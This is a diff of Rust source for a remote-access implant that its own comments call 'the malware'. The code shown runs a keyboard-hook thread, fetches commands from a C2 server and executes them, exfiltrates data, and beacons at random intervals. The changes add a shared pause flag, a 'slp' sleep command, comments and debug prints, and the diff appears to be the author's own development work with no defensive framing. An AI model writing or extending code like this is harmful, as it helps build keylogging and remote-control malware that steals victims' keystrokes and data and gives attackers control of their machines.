@@ -83,6 +83,7 @@ iwIDAQAB
     let server_for_command = Arc::clone(&server);
     let id_command = id.clone();
 
+    //arc variables to share the same pause
     let paused_hook = Arc::clone(&paused);
     let paused_command = Arc::clone(&paused);
     let paused_exfil = Arc::clone(&paused);
@@ -90,6 +91,9 @@ iwIDAQAB
     //thread that handels keyboard hooks
     tokio::spawn(async move {
         loop {
+
+             //sleeps the malware for a predefined time
+            //used by the malware author to sleep
             if paused_hook.load(Ordering::Relaxed) {
                 sleep(Duration::from_secs(1)).await;
                 continue;
@@ -111,13 +115,16 @@ iwIDAQAB
         let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
         loop {
 
-            //used to pause commands
+            //sleeps the malware for a predefined time
+            //used by the malware author to sleep
             if paused_command.load(Ordering::Relaxed) {
                 sleep(Duration::from_secs(1)).await;
                 continue;
             }
             
+            //get command from c2 server
             let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
+            //then execute the command
             execute_command(&rec, paused_command.clone()).await;
 
             //makes it so that the malware sends requests at random intervals.
@@ -132,6 +139,9 @@ iwIDAQAB
         loop {
             //create ranom number generator
             let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
+
+            //sleeps the malware for a predefined time
+            //used by the malware author to sleep
             if paused_exfil.load(Ordering::Relaxed) {
                 sleep(Duration::from_secs(1)).await;
                 continue;
@@ -150,6 +160,14 @@ iwIDAQAB
 
     // Main loop for beaconing
     loop {
+
+        //sleeps the malware for a predefined time
+        //used by the malware author to sleep
+        if paused.load(Ordering::Relaxed) {
+            sleep(Duration::from_secs(1)).await;
+            continue;
+        }
+
         //create ranom number generator
         let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
         //sends a becon to the c2 server
@@ -181,12 +199,13 @@ async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
 
         //if it's a slp sleep the malware
         "slp" => {
-
+            println!("{}", cmds[0]);
             if let Ok(secs) = cmds[1].replace('\n', "").parse() {
-                println!("Sleeping all background threads for {} seconds", secs);
+                println!("[Debugging]: Sleeping all background threads for {} seconds", secs);
                 paused.store(true, Ordering::Relaxed);
                 sleep(Duration::from_secs(secs)).await;
                 paused.store(false, Ordering::Relaxed);
+                print!("[Debugging]: Wakeed up now")
             }
         }
         //if it's shd shut down the malware
